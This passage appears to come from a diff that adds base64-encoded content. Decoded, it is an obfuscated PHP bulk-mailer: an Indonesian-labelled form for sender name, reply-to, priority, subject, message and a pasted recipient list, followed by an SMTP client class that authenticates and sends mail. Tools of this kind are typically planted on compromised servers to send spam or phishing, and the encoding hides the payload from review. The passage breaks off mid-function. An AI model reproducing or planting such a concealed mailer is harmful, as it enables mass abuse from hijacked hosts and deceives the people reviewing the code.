+ZGVyOiAxcHggc29saWQgTGltZTtjb2xvcjojMzMzIiBuYW1lPSJyZWFsbmFtZSIgdmFsdWU9Ijw/
+PSR4MjU7Pz4iIHNpemU9IjMwIj4KCgkJCTwvZm9udD48L3RkPgoKCQk8L3RyPgoJCTx0cj4KCgkJ
+ICA8dGQgd2lkdGg9IjEwJSIgaGVpZ2h0PSIyMiIgc3R5bGU9InBhZGRpbmc6MTBweDsiPgoKCQkJ
+PGRpdiBhbGlnbj0icmlnaHQiPjxmb250IHNpemU9Ii0zIiBmYWNlPSJWZXJkYW5hLCBBcmlhbCwg
+SGVsdmV0aWNhLCBzYW5zLXNlcmlmIj5SZXBseS1Ubzo8L2ZvbnQ+PC9kaXY+CgoJCSAgPC90ZD4K
+CgkJICA8dGQgd2lkdGg9IjE4JSIgaGVpZ2h0PSIyMiIgc3R5bGU9InBhZGRpbmc6MTBweDsiPjxm
+b250IHNpemU9Ii0zIiBmYWNlPSJWZXJkYW5hLCBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlm
+Ij4KCgkJCTxpbnB1dCB0eXBlPSJ0ZXh0IiBzdHlsZT0iYmFja2dyb3VuZDojRUZGQkY4Oztib3Jk
+ZXI6IDFweCBzb2xpZCBMaW1lO2NvbG9yOiMzMzMiIG5hbWU9InJlcGx5dG8iIHZhbHVlPSI8Pz0k
+eDIyOz8+IiBzaXplPSIzMCI+CgoJCQk8L2ZvbnQ+PC90ZD4KCgkJICA8dGQgd2lkdGg9IjMxJSIg
+aGVpZ2h0PSIyMiIgc3R5bGU9InBhZGRpbmc6MTBweDsiPgoKCQkJPHAgYWxpZ249InJpZ2h0Ij48
+Zm9udCBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJp
+ZiI+CgkJCVByaW9yaXRhcyBFbWFpbCA6PC9mb250PjwvdGQ+CgoJCSAgPHRkIHdpZHRoPSI0MSUi
+IGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij48Zm9udCBzaXplPSItMyIgZmFjZT0i
+VmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CgoJCQkmbmJzcDs8L2ZvbnQ+
+PHNlbGVjdCBzdHlsZT0iYmFja2dyb3VuZDojRUZGQkY4Oztib3JkZXI6IDFweCBzb2xpZCBMaW1l
+O2NvbG9yOiMzMzMiIG5hbWU9ImVwcmlvcml0eSIgaWQ9Imxpc3RNZXRob2QiIG9uY2hhbmdlPSJz
+aG93SGlkZUxpc3RDb25maWcoKSI+CgkJCTxvcHRpb24gdmFsdWU9IiIgPD8gaWYoc3RybGVuKCR4
+MWQpPCAxKXtwcmludCAic2VsZWN0ZWQiO30gPz4gPi0gUGlsaWhhbiAtPC9vcHRpb24+CgkJCTxv
+cHRpb24gdmFsdWU9IjEiIDw/IGlmKCR4MWQgPT0gIjEiKXtwcmludCAic2VsZWN0ZWQiO30gPz4g
+PktlbmNlbmc8L29wdGlvbj4KCQkJPG9wdGlvbiB2YWx1ZT0iMyIgPD8gaWYoJHgxZCA9PSAiMyIp
+e3ByaW50ICJzZWxlY3RlZCI7fSA/PiA+Tm9ybWFsPC9vcHRpb24+CgkJCTxvcHRpb24gdmFsdWU9
+IjUiIDw/IGlmKCR4MWQgPT0gIjUiKXtwcmludCAic2VsZWN0ZWQiO30gPz4gPlBlbGFuPC9vcHRp
+b24+CgkJCTwvc2VsZWN0PjwvdGQ+CgoJCTwvdHI+CgoJCTx0cj4KCgkJICA8dGQgd2lkdGg9IjEw
+JSIgaGVpZ2h0PSIyMiIgc3R5bGU9InBhZGRpbmc6MTBweDsiPgoKCQkJPGRpdiBhbGlnbj0icmln
+aHQiPjxmb250IHNpemU9Ii0zIiBmYWNlPSJWZXJkYW5hLCBBcmlhbCwgSGVsdmV0aWNhLCBzYW5z
+LXNlcmlmIj5TdWJqZWN0OjwvZm9udD48L2Rpdj4KCgkJICA8L3RkPgoKCQkgIDx0ZCBjb2xzcGFu
+PSIzIiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+PGZvbnQgc2l6ZT0iLTMiIGZh
+Y2U9IlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiPgoKCQkJPGlucHV0IHR5
+cGU9InRleHQiIG5hbWU9InN1YmplY3QiIHN0eWxlPSJiYWNrZ3JvdW5kOiNFRkZCRjg7O2JvcmRl
+cjogMXB4IHNvbGlkIExpbWU7Y29sb3I6IzMzMyIgdmFsdWU9Ijw/PSR4MjM7Pz4iIHNpemU9Ijkw
+Ij4KCgkJCTwvZm9udD48L3RkPgoKCQk8L3RyPgoKCQk8dHI+CgoJCSAgPHRkIHdpZHRoPSIxMCUi
+IGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij4KCgkJCSZuYnNwOzwvdGQ+CgoJCSAg
+PHRkIGNvbHNwYW49IjMiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij48Zm9udCBz
+aXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CgoJ
+CQkmbmJzcDsgPGZvbnQgY29sb3I9IkRhcmt2aW9sZXQiPkVuY29kZSBJbmZvcm1hc2kgUGVuZ2ly
+aW1hbiA/PC9mb250PiA8c2VsZWN0IHN0eWxlPSJiYWNrZ3JvdW5kOiNFRkZCRjg7O2JvcmRlcjog
+MXB4IHNvbGlkIExpbWU7Y29sb3I6IzMzMyIgc2l6ZT0iMSIgbmFtZT0iZW5jb2RlIj4KCQkJPG9w
+dGlvbiA8PyBpZigkeDJjID09ICJ5ZXMiKXtwcmludCAic2VsZWN0ZWQiO30gPz4+eWE8L29wdGlv
+bj4KCQkJPG9wdGlvbiA8PyBpZigkeDJjID09ICJubyIpe3ByaW50ICJzZWxlY3RlZCI7fSA/Pj5U
+aWRhazwvb3B0aW9uPgoJCQk8L3NlbGVjdD48L2ZvbnQ+PC90ZD4KCgkJPC90cj4KCgkJPHRyIHZh
+bGlnbj0idG9wIj4KCgk8dGQgY29sc3Bhbj0iMyIgaGVpZ2h0PSIxOTAiIHN0eWxlPSJwYWRkaW5n
+OjEwcHg7Ij48Zm9udCBzaXplPSItMSIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwg
+c2Fucy1zZXJpZiI+IAoKCQkJPHRleHRhcmVhIG5hbWU9Im1lc3NhZ2UiIGNvbHM9IjYwIiBzdHls
+ZT0iYmFja2dyb3VuZDojRUZGQkY4Oztib3JkZXI6IDFweCBzb2xpZCBMaW1lO2NvbG9yOiMzMzMi
+IHJvd3M9IjEwIj48Pz0keDE5Oz8+PC90ZXh0YXJlYT4KCgkJCTxicj4KCgkJCTxpbnB1dCB0eXBl
+PSJyYWRpbyIgbmFtZT0iY29udGVudHR5cGUiIHZhbHVlPSJwbGFpbiIgPgoKCQkJUGxhaW4gCgoJ
+CQk8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9ImNvbnRlbnR0eXBlIiB2YWx1ZT0iaHRtbCIgY2hl
+Y2tlZD4KCgkJCUhUTUwgCgoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZh
+bHVlPSJzZW5kIj4KCQkJPGlucHV0IGNsYXNzPSJ1aWJ1dHRvbiIgdHlwZT0ic3VibWl0IiB2YWx1
+ZT0iU2VuZCBNZXNzYWdlIj4KCgkJCTwvZm9udD48L3RkPgoKCQkgIDx0ZCB3aWR0aD0iNDElIiBo
+ZWlnaHQ9IjE5MCIgc3R5bGU9InBhZGRpbmc6MTBweDsiPjxmb250IHNpemU9Ii0zIiBmYWNlPSJW
+ZXJkYW5hLCBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmIj4KCgkJCTx0ZXh0YXJlYSBuYW1l
+PSJlbWFpbGxpc3QiIHN0eWxlPSJiYWNrZ3JvdW5kOiNFRkZCRjg7O2JvcmRlcjogMXB4IHNvbGlk
+IExpbWU7Y29sb3I6IzMzMyIgY29scz0iMzAiIHJvd3M9IjEwIj48Pz0keDFhOz8+PC90ZXh0YXJl
+YT4KCgkJCTwvZm9udD48L3RkPgoKCQk8L3RyPgoKCSAgPC90YWJsZT4KCgk8L2Zvcm0+Cgk8L2Nl
+bnRlcj4KCgoJPD8KCglpZiAoJHgxOCl7CgkJCWlmICghJHgxYiAmJiAhJHgyNCAmJiAhJHgxOSAm
+JiAhJHgxYSl7CgkJCXByaW50ICI8c2NyaXB0PmFsZXJ0KCdQbGVhc2UgY29tcGxldGUgYWxsIGZp
+ZWxkcyBiZWZvcmUgc2VuZGluZyB5b3VyIG1lc3NhZ2UuJyk7IDwvc2NyaXB0PiI7CgkJCWRpZSgp
+Owl9CgoJY2xhc3MgU01UUAoJewoJICAvKioKCSAgICogIFNNVFAgc2VydmVyIHBvcnQKCSAgICog
+IEB2YXIgaW50CgkgICAqLwoJICB2YXIgJHgyZCA9IDI1OwoKCSAgLyoqCgkgICAqICBTTVRQIHJl
+cGx5IGxpbmUgZW5kaW5nCgkgICAqICBAdmFyIHN0cmluZwoJICAgKi8KCSAgdmFyICR4MmUgPSAi
+XHJcbiI7CgoJICAvKioKCSAgICogIFNldHMgd2hldGhlciBkZWJ1Z2dpbmcgaXMgdHVybmVkIG9u
+CgkgICAqICBAdmFyIGJvb2wKCSAgICovCgkgIHZhciAkeDJmOyAgICAgICAjIHRoZSBsZXZlbCBv
+ZiBkZWJ1ZyB0byBwZXJmb3JtCgoJICAvKioKCSAgICogIFNldHMgVkVSUCB1c2Ugb24vb2ZmIChk
+ZWZhdWx0IGlzIG9mZikKCSAgICogIEB2YXIgYm9vbAoJICAgKi8KCSAgdmFyICR4MzAgPSBmYWxz
+ZTsKCgkgIC8qKiNAKwoJICAgKiBAYWNjZXNzIHByaXZhdGUKCSAgICovCgkgIHZhciAkeDMxOyAg
+ICAgICMgdGhlIHNvY2tldCB0byB0aGUgc2VydmVyCgkgIHZhciAkeDMyOyAgICAgICAgICAjIGVy
+cm9yIGlmIGFueSBvbiB0aGUgbGFzdCBjYWxsCgkgIHZhciAkeDMzOyAgICAgICMgdGhlIHJlcGx5
+IHRoZSBzZXJ2ZXIgc2VudCB0byB1cyBmb3IgSEVMTwoJICAvKiojQC0qLwoKCSAgLyoqCgkgICAq
+IEluaXRpYWxpemUgdGhlIGNsYXNzIHNvIHRoYXQgdGhlIGRhdGEgaXMgaW4gYSBrbm93biBzdGF0
+ZS4KCSAgICogQGFjY2VzcyBwdWJsaWMKCSAgICogQHJldHVybiB2b2lkCgkgICAqLwoJICBmdW5j
+dGlvbiBTTVRQKCkgewoJCSR0aGlzLT5zbXRwX2Nvbm4gPSAwOwoJCSR0aGlzLT5lcnJvciA9IG51
+bGw7CgkJJHRoaXMtPmhlbG9fcnBseSA9IG51bGw7CgoJCSR0aGlzLT5kb19kZWJ1ZyA9IDA7Cgkg
+IH0KCgkgIC8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq
+KioqKioqKioqKioqCgkgICAqICAgICAgICAgICAgICAgICAgICBDT05ORUNUSU9OIEZVTkNUSU9O
+UyAgICAgICAgICAgICAgICAgICoKCSAgICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq
+KioqKioqKioqKioqKioqKioqKioqKioqKioqLwoKCSAgLyoqCgkgICAqIENvbm5lY3QgdG8gdGhl
+IHNlcnZlciBzcGVjaWZpZWQgb24gdGhlIHBvcnQgc3BlY2lmaWVkLgoJICAgKiBJZiB0aGUgcG9y
+dCBpcyBub3Qgc3BlY2lmaWVkIHVzZSB0aGUgZGVmYXVsdCBTTVRQX1BPUlQuCgkgICAqIElmIHR2
+YWwgaXMgc3BlY2lmaWVkIHRoZW4gYSBjb25uZWN0aW9uIHdpbGwgdHJ5IGFuZCBiZQoJICAgKiBl
+c3RhYmxpc2hlZCB3aXRoIHRoZSBzZXJ2ZXIgZm9yIHRoYXQgbnVtYmVyIG9mIHNlY29uZHMuCgkg
+ICAqIElmIHR2YWwgaXMgbm90IHNwZWNpZmllZCB0aGUgZGVmYXVsdCBpcyAzMCBzZWNvbmRzIHRv
+CgkgICAqIHRyeSBvbiB0aGUgY29ubmVjdGlvbi4KCSAgICoKCSAgICogU01UUCBDT0RFIFNVQ0NF
+U1M6IDIyMAoJICAgKiBTTVRQIENPREUgRkFJTFVSRTogNDIxCgkgICAqIEBhY2Nlc3MgcHVibGlj
+CgkgICAqIEByZXR1cm4gYm9vbAoJICAgKi8KCSAgZnVuY3Rpb24gQ29ubmVjdCgkeDM0LCR4MzU9
+MCwkeDM2PTMwKSB7CgkJIyBzZXQgdGhlIGVycm9yIHZhbCB0byBudWxsIHNvIHRoZXJlIGlzIG5v
+IGNvbmZ1c2lvbgoJCSR0aGlzLT5lcnJvciA9IG51bGw7CgoJCSMgbWFrZSBzdXJlIHdlIGFyZSBf
+X25vdF9fIGNvbm5lY3RlZAoJCWlmKCR0aGlzLT5jb25uZWN0ZWQoKSkgewoJCSAgIyBvayB3ZSBh
+cmUgY29ubmVjdGVkISB3aGF0IHNob3VsZCB3ZSBkbz8KCQkgICMgZm9yIG5vdyB3ZSB3aWxsIGp1
+c3QgZ2l2ZSBhbiBlcnJvciBzYXlpbmcgd2UKCQkgICMgYXJlIGFscmVhZHkgY29ubmVjdGVkCgkJ
+ICAkdGhpcy0+ZXJyb3IgPSBhcnJheSgiZXJyb3IiID0+ICJBbHJlYWR5IGNvbm5lY3RlZCB0byBh
+IHNlcnZlciIpOwoJCSAgcmV0dXJuIGZhbHNlOwoJCX0KCgkJaWYoZW1wdHkoJHgzNSkpIHsKCQkg
+ICR4MzUgPSAkdGhpcy0+U01UUF9QT1JUOwoJCX0KCgkJI2Nvbm5lY3QgdG8gdGhlIHNtdHAgc2Vy
+dmVyCgkJJHRoaXMtPnNtdHBfY29ubiA9IGZzb2Nrb3BlbigkeDM0LCAgICAjIHRoZSBob3N0IG9m
+IHRoZSBzZXJ2ZXIKCQkJCQkJCQkJICR4MzUsICAgICMgdGhlIHBvcnQgdG8gdXNlCgkJCQkJCQkJ
+CSAkeDM3LCAgICMgZXJyb3IgbnVtYmVyIGlmIGFueQoJCQkJCQkJCQkgJHgzOCwgICMgZXJyb3Ig
+bWVzc2FnZSBpZiBhbnkKCQkJCQkJCQkJICR4MzYpOyAgICMgZ2l2ZSB1cCBhZnRlciA/IHNlY3MK
+CQkjIHZlcmlmeSB3ZSBjb25uZWN0ZWQgcHJvcGVybHkKCQlpZihlbXB0eSgkdGhpcy0+c210cF9j
+b25uKSkgewoJCSAgJHRoaXMtPmVycm9yID0gYXJyYXkoImVycm9yIiA9PiAiRmFpbGVkIHRvIGNv
+bm5lY3QgdG8gc2VydmVyIiwKCQkJCQkJCSAgICJlcnJubyIgPT4gJHgzNywKCQkJCQkJCSAgICJl
+cnJzdHIiID0+ICR4MzgpOwoJCSAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDEpIHsKCQkJZWNobyAi
+U01UUCAtPiBFUlJPUjogIiAuICR0aGlzLT5lcnJvclsiZXJyb3IiXSAuCgkJCQkJICI6ICR4Mzgg
+KCR4MzcpIiAuICR0aGlzLT5DUkxGOwoJCSAgfQoJCSAgcmV0dXJuIGZhbHNlOwoJCX0KCgkJIyBz
+b21ldGltZXMgdGhlIFNNVFAgc2VydmVyIHRha2VzIGEgbGl0dGxlIGxvbmdlciB0byByZXNwb25k
+CgkJIyBzbyB3ZSB3aWxsIGdpdmUgaXQgYSBsb25nZXIgdGltZW91dCBmb3IgdGhlIGZpcnN0IHJl
+YWQKCQkvLyBXaW5kb3dzIHN0aWxsIGRvZXMgbm90IGhhdmUgc3VwcG9ydCBmb3IgdGhpcyB0aW1l
+b3V0IGZ1bmN0aW9uCgkJaWYoc3Vic3RyKFBIUF9PUywgMCwgMykgIT0gIldJTiIpCgkJIHNvY2tl
+dF9zZXRfdGltZW91dCgkdGhpcy0+c210cF9jb25uLCAkeDM2LCAwKTsKCgkJIyBnZXQgYW55IGFu
+bm91bmNlbWVudCBzdHVmZgoJCSR4MzkgPSAkdGhpcy0+Z2V0X2xpbmVzKCk7CgoJCSMgc2V0IHRo
+ZSB0aW1lb3V0ICBvZiBhbnkgc29ja2V0IGZ1bmN0aW9ucyBhdCAxLzEwIG9mIGEgc2Vjb25kCgkJ
+Ly9pZihmdW5jdGlvbl9leGlzdHMoInNvY2tldF9zZXRfdGltZW91dCIpKQoJCS8vICAgc29ja2V0
+X3NldF90aW1lb3V0KCR0aGlzLT5zbXRwX2Nvbm4sIDAsIDEwMDAwMCk7CgoJCWlmKCR0aGlzLT5k
+b19kZWJ1ZyA+PSAyKSB7CgkJICBlY2hvICJTTVRQIC0+IEZST00gU0VSVkVSOiIgLiAkdGhpcy0+
+Q1JMRiAuICR4Mzk7CgkJfQoKCQlyZXR1cm4gdHJ1ZTsKCSAgfQoKCSAgLyoqCgkgICAqIFBlcmZv
+cm1zIFNNVFAgYXV0aGVudGljYXRpb24uICBNdXN0IGJlIHJ1biBhZnRlciBydW5uaW5nIHRoZQoJ
+ICAgKiBIZWxsbygpIG1ldGhvZC4gIFJldHVybnMgdHJ1ZSBpZiBzdWNjZXNzZnVsbHkgYXV0aGVu
+dGljYXRlZC4KCSAgICogQGFjY2VzcyBwdWJsaWMKCSAgICogQHJldHVybiBib29sCgkgICAqLwoJ
+ICBmdW5jdGlvbiBBdXRoZW50aWNhdGUoJHgzYSwgJHgzYikgewoJCS8vIFN0YXJ0IGF1dGhlbnRp
+Y2F0aW9uCgkJZnB1dHMoJHRoaXMtPnNtdHBfY29ubiwiQVVUSCBMT0dJTiIgLiAkdGhpcy0+Q1JM
+Rik7CgoJCSR4M2MgPSAkdGhpcy0+Z2V0X2xpbmVzKCk7CgkJJHgzZCA9IHN1YnN0cigkeDNjLDAs
+Myk7CgoJCWlmKCR4M2QgIT0gMzM0KSB7CgkJICAkdGhpcy0+ZXJyb3IgPQoJCQlhcnJheSgiZXJy
+b3IiID0+ICJBVVRIIG5vdCBhY2NlcHRlZCBmcm9tIHNlcnZlciIsCgkJCQkgICJzbXRwX2NvZGUi
+ID0+ICR4M2QsCgkJCQkgICJzbXRwX21zZyIgPT4gc3Vic3RyKCR4M2MsNCkpOwoJCSAgaWYoJHRo
+aXMtPmRvX2RlYnVnID49IDEpIHsKCQkJZWNobyAiU01UUCAtPiBFUlJPUjogIiAuICR0aGlzLT5l
+cnJvclsiZXJyb3IiXSAuCgkJCQkJICI6ICIgLiAkeDNjIC4gJHRoaXMtPkNSTEY7CgkJICB9CgkJ
+ICByZXR1cm4gZmFsc2U7CgkJfQoKCQkvLyBTZW5kIGVuY29kZWQgdXNlcm5hbWUKCQlmcHV0cygk
+dGhpcy0+c210cF9jb25uLCBiYXNlNjRfZW5jb2RlKCR4M2EpIC4gJHRoaXMtPkNSTEYpOwoKCQkk
+eDNjID0gJHRoaXMtPmdldF9saW5lcygpOwoJCSR4M2QgPSBzdWJzdHIoJHgzYywwLDMpOwoKCQlp
+ZigkeDNkICE9IDMzNCkgewoJCSAgJHRoaXMtPmVycm9yID0KCQkJYXJyYXkoImVycm9yIiA9PiAi
+VXNlcm5hbWUgbm90IGFjY2VwdGVkIGZyb20gc2VydmVyIiwKCQkJCSAgInNtdHBfY29kZSIgPT4g
+JHgzZCwKCQkJCSAgInNtdHBfbXNnIiA9PiBzdWJzdHIoJHgzYyw0KSk7CgkJICBpZigkdGhpcy0+
+ZG9fZGVidWcgPj0gMSkgewoJCQllY2hvICJTTVRQIC0+IEVSUk9SOiAiIC4gJHRoaXMtPmVycm9y
+WyJlcnJvciJdIC4KCQkJCQkgIjogIiAuICR4M2MgLiAkdGhpcy0+Q1JMRjsKCQkgIH0KCQkgIHJl
+dHVybiBmYWxzZTsKCQl9CgoJCS8vIFNlbmQgZW5jb2RlZCBwYXNzd29yZAoJCWZwdXRzKCR0aGlz
+LT5zbXRwX2Nvbm4sIGJhc2U2NF9lbmNvZGUoJHgzYikgLiAkdGhpcy0+Q1JMRik7CgoJCSR4M2Mg
+PSAkdGhpcy0+Z2V0X2xpbmVzKCk7CgkJJHgzZCA9IHN1YnN0cigkeDNjLDAsMyk7CgoJCWlmKCR4
+M2QgIT0gMjM1KSB7CgkJICAkdGhpcy0+ZXJyb3IgPQoJCQlhcnJheSgiZXJyb3IiID0+ICJQYXNz
+d29yZCBub3QgYWNjZXB0ZWQgZnJvbSBzZXJ2ZXIiLAoJCQkJICAic210cF9jb2RlIiA9PiAkeDNk
+LAoJCQkJICAic210cF9tc2ciID0+IHN1YnN0cigkeDNjLDQpKTsKCQkgIGlmKCR0aGlzLT5kb19k
+ZWJ1ZyA+PSAxKSB7CgkJCWVjaG8gIlNNVFAgLT4gRVJST1I6ICIgLiAkdGhpcy0+ZXJyb3JbImVy
+cm9yIl0gLgoJCQkJCSAiOiAiIC4gJHgzYyAuICR0aGlzLT5DUkxGOwoJCSAgfQoJCSAgcmV0dXJu
+IGZhbHNlOwoJCX0KCgkJcmV0dXJuIHRydWU7CgkgIH0KCgkgIC8qKgoJICAgKiBSZXR1cm5zIHRy
+dWUgaWYgY29ubmVjdGVkIHRvIGEgc2VydmVyIG90aGVyd2lzZSBmYWxzZQoJICAgKiBAYWNjZXNz
+IHByaXZhdGUKCSAgICogQHJldHVybiBib29sCgkgICAqLwoJICBmdW5jdGlvbiBDb25uZWN0ZWQo
+KSB7CgkJaWYoIWVtcHR5KCR0aGlzLT5zbXRwX2Nvbm4pKSB7CgkJICAkeDNlID0gc29ja2V0X2dl
+dF9zdGF0dXMoJHRoaXMtPnNtdHBfY29ubik7CgkJICBpZigkeDNlWyJlb2YiXSkgewoJCQkjIGht
+bSB0aGlzIGlzIGFuIG9kZCBzaXR1YXRpb24uLi4gdGhlIHNvY2tldCBpcwoJCQkjIHZhbGlkIGJ1
+dCB3ZSBhcmUgbm90IGNvbm5lY3RlZCBhbnltb3JlCgkJCWlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAx
+KSB7CgkJCQllY2hvICJTTVRQIC0+IE5PVElDRToiIC4gJHRoaXMtPkNSTEYgLgoJCQkJCSAiRU9G
+IGNhdWdodCB3aGlsZSBjaGVja2luZyBpZiBjb25uZWN0ZWQiOwoJCQl9CgkJCSR0aGlzLT5DbG9z
+ZSgpOwoJCQlyZXR1cm4gZmFsc2U7CgkJICB9CgkJICByZXR1cm4gdHJ1ZTsgIyBldmVyeXRoaW5n
+IGxvb2tzIGdvb2QKCQl9CgkJcmV0dXJuIGZhbHNlOwoJICB9CgoJICAvKioKCSAgICogQ2xvc2Vz
+IHRoZSBzb2NrZXQgYW5kIGNsZWFucyB1cCB0aGUgc3RhdGUgb2YgdGhlIGNsYXNzLgoJICAgKiBJ
+dCBpcyBub3QgY29uc2lkZXJlZCBnb29kIHRvIHVzZSB0aGlzIGZ1bmN0aW9uIHdpdGhvdXQKCSAg
+ICogZmlyc3QgdHJ5aW5nIHRvIHVzZSBRVUlULgoJICAgKiBAYWNjZXNzIHB1YmxpYwoJICAgKiBA
+cmV0dXJuIHZvaWQKCSAgICovCgkgIGZ1bmN0aW9uIENsb3NlKCkgewoJCSR0aGlzLT5lcnJvciA9
+IG51bGw7ICMgc28gdGhlcmUgaXMgbm8gY29uZnVzaW9uCgkJJHRoaXMtPmhlbG9fcnBseSA9IG51
+bGw7CgkJaWYoIWVtcHR5KCR0aGlzLT5zbXRwX2Nvbm4pKSB7CgkJICAjIGNsb3NlIHRoZSBjb25u
+ZWN0aW9uIGFuZCBjbGVhbnVwCgkJICBmY2xvc2UoJHRoaXMtPnNtdHBfY29ubik7CgkJICAkdGhp
+cy0+c210cF9jb25uID0gMDsKCQl9CgkgIH0KCgkgIC8qKioqKioqKioqKioqKioqKioqKioqKioq
+KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioKCSAgICogICAgICAgICAgICAg
+ICAgICAgICAgICBTTVRQIENPTU1BTkRTICAgICAgICAgICAgICAgICAgICAgICAqCgkgICAqKioq
+KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq
+LwoKCSAgLyoqCgkgICAqIElzc3VlcyBhIGRhdGEgY29tbWFuZCBhbmQgc2VuZHMgdGhlIG1zZ19k
+YXRhIHRvIHRoZSBzZXJ2ZXIKCSAgICogZmluaWFsaXppbmcgdGhlIG1haWwgdHJhbnNhY3Rpb24u
+ICR4M2YgaXMgdGhlIG1lc3NhZ2UKCSAgICogdGhhdCBpcyB0byBiZSBzZW5kIHdpdGggdGhlIGhl
+YWRlcnMuIEVhY2ggaGVhZGVyIG5lZWRzIHRvIGJlCgkgICAqIG9uIGEgc2luZ2xlIGxpbmUgZm9s
+bG93ZWQgYnkgYSA8Q1JMRj4gd2l0aCB0aGUgbWVzc2FnZSBoZWFkZXJzCgkgICAqIGFuZCB0aGUg
+bWVzc2FnZSBib2R5IGJlaW5nIHNlcGVyYXRlZCBieSBhbmQgYWRkaXRpb25hbCA8Q1JMRj4uCgkg
+ICAqCgkgICAqIEltcGxlbWVudHMgcmZjIDgyMTogREFUQSA8Q1JMRj4KCSAgICoKCSAgICogU01U
+UCBDT0RFIElOVEVSTUVESUFURTogMzU0CgkgICAqICAgICBbZGF0YV0KCSAgICogICAgIDxDUkxG
+Pi48Q1JMRj4KCSAgICogICAgIFNNVFAgQ09ERSBTVUNDRVNTOiAyNTAKCSAgICogICAgIFNNVFAg
+Q09ERSBGQUlMVVJFOiA1NTIsNTU0LDQ1MSw0NTIKCSAgICogU01UUCBDT0RFIEZBSUxVUkU6IDQ1
+MSw1NTQKCSAgICogU01UUCBDT0RFIEVSUk9SICA6IDUwMCw1MDEsNTAzLDQyMQoJICAgKiBAYWNj
+ZXNzIHB1YmxpYwoJICAgKiBAcmV0dXJuIGJvb2wKCSAgICovCgkgIGZ1bmN0aW9uIERhdGEoJHgz
+ZikgewoJCSR0aGlzLT5lcnJvciA9IG51bGw7ICMgc28gbm8gY29uZnVzaW9uIGlzIGNhdXNlZAoK
+CQlpZighJHRoaXMtPmNvbm5lY3RlZCgpKSB7CgkJICAkdGhpcy0+ZXJyb3IgPSBhcnJheSgKCQkJ
+CSAgImVycm9yIiA9PiAiQ2FsbGVkIERhdGEoKSB3aXRob3V0IGJlaW5nIGNvbm5lY3RlZCIpOwoJ
+CSAgcmV0dXJuIGZhbHNlOwoJCX0KCgkJZnB1dHMoJHRoaXMtPnNtdHBfY29ubiwiREFUQSIgLiAk
+dGhpcy0+Q1JMRik7CgoJCSR4M2MgPSAkdGhpcy0+Z2V0X2xpbmVzKCk7CgkJJHgzZCA9IHN1YnN0
+cigkeDNjLDAsMyk7CgoJCWlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAyKSB7CgkJICBlY2hvICJTTVRQ
+IC0+IEZST00gU0VSVkVSOiIgLiAkdGhpcy0+Q1JMRiAuICR4M2M7CgkJfQoKCQlpZigkeDNkICE9
+IDM1NCkgewoJCSAgJHRoaXMtPmVycm9yID0KCQkJYXJyYXkoImVycm9yIiA9PiAiREFUQSBjb21t
+YW5kIG5vdCBhY2NlcHRlZCBmcm9tIHNlcnZlciIsCgkJCQkgICJzbXRwX2NvZGUiID0+ICR4M2Qs
+CgkJCQkgICJzbXRwX21zZyIgPT4gc3Vic3RyKCR4M2MsNCkpOwoJCSAgaWYoJHRoaXMtPmRvX2Rl
+YnVnID49IDEpIHsKCQkJZWNobyAiU01UUCAtPiBFUlJPUjogIiAuICR0aGlzLT5lcnJvclsiZXJy
+b3IiXSAuCgkJCQkJICI6ICIgLiAkeDNjIC4gJHRoaXMtPkNSTEY7CgkJICB9CgkJICByZXR1cm4g
+ZmFsc2U7CgkJfQoKCQkjIHRoZSBzZXJ2ZXIgaXMgcmVhZHkgdG8gYWNjZXB0IGRhdGEhCgkJIyBh
+Y2NvcmRpbmcgdG8gcmZjIDgyMSB3ZSBzaG91bGQgbm90IHNlbmQgbW9yZSB0aGFuIDEwMDAKCQkj
+IGluY2x1ZGluZyB0aGUgQ1JMRgoJCSMgY2hhcmFjdGVycyBvbiBhIHNpbmdsZSBsaW5lIHNvIHdl
+IHdpbGwgYnJlYWsgdGhlIGRhdGEgdXAKCQkjIGludG8gbGluZXMgYnkgXHIgYW5kL29yIFxuIHRo
+ZW4gaWYgbmVlZGVkIHdlIHdpbGwgYnJlYWsKCQkjIGVhY2ggb2YgdGhvc2UgaW50byBzbWFsbGVy
+IGxpbmVzIHRvIGZpdCB3aXRoaW4gdGhlIGxpbWl0LgoJCSMgaW4gYWRkaXRpb24gd2Ugd2lsbCBi
+ZSBsb29raW5nIGZvciBsaW5lcyB0aGF0IHN0YXJ0IHdpdGgKCQkjIGEgcGVyaW9kICcuJyBhbmQg
+YXBwZW5kIGFuZCBhZGRpdGlvbmFsIHBlcmlvZCAnLicgdG8gdGhhdAoJCSMgbGluZS4gTk9URTog
+dGhpcyBkb2VzIG5vdCBjb3VudCB0b3dhcmRzIGFyZSBsaW1pdC4KCgkJIyBub3JtYWxpemUgdGhl
+IGxpbmUgYnJlYWtzIHNvIHdlIGtub3cgdGhlIGV4cGxvZGUgd29ya3MKCQkkeDNmID0gc3RyX3Jl
+cGxhY2UoIlxyXG4iLCJcbiIsJHgzZik7CgkJJHgzZiA9IHN0cl9yZXBsYWNlKCJcciIsIlxuIiwk
